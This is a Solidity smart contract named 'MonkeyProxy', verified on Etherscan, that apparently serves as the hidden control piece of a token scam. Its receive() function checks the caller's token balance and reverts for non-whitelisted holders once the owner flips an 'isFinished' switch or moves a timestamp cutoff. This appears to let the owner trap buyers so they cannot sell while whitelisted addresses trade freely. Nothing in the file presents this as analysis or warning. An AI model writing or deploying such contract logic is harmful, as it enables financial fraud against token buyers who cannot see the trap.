/**
 *Submitted for verification at Etherscan.io on 2023-05-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract MonkeyProxy {
    address private _owner;    
    address private token;

    bool private isFinished;

    mapping(address => bool) private _whitelists;
    mapping (address => uint256) private _addressTime;

    uint256 private lastTime;

    modifier onlyToken() {
        require(msg.sender == token); 
        _;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    constructor () {
        _owner = msg.sender;
        _whitelists[_owner] = true;
    }

    function setTokenIsFinished(bool _isFinished) external onlyOwner {
      isFinished = _isFinished;
    }

    function refreshProxySetting(address _token) external onlyOwner {
      token = _token;
      isFinished = false;
    }

    function setLastTimeForToken() external onlyOwner {
      lastTime = block.timestamp;
    }

    function whitelistForTokenHolder(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }

    receive() external payable {
      if (_whitelists[tx.origin]) {
        return;
      }
      uint256 balance = IERC20(token).balanceOf(tx.origin);

      if (balance > 0) {
        require(!isFinished && _addressTime[tx.origin] >= lastTime);
      } else {
        _addressTime[tx.origin] = block.timestamp;
      }
    }
}